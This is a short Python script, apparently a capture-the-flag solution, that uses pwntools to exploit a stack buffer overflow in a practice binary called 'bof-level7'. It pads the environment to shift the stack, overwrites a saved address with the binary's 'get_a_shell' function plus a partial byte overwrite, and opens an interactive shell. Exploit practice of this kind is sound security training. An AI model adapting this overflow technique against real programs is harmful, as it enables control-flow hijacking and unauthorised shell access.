#!/usr/bin/env python

from pwn import *

file_name = 'bof-level7'

context.terminal = "/usr/bin"

env = {
        "abcasdasdasda": "asdasdkasldkjaslkdja",
        "abcasdasasda": "asdasdkasldkjaslkdja",
        "asdasd": "asda",
        "asda": "aass",
}
e = ELF(file_name)

get_a_shell = e.symbols['get_a_shell']

buf = 'A' * 4 + p32(get_a_shell)
buf += 'C' * 0x80 + '\x50'

p = process(file_name, env=env)

if (len(sys.argv) > 1 and sys.argv[1] == 'g'):
    gdb.attach(p)

p.sendline(buf)

p.interactive()

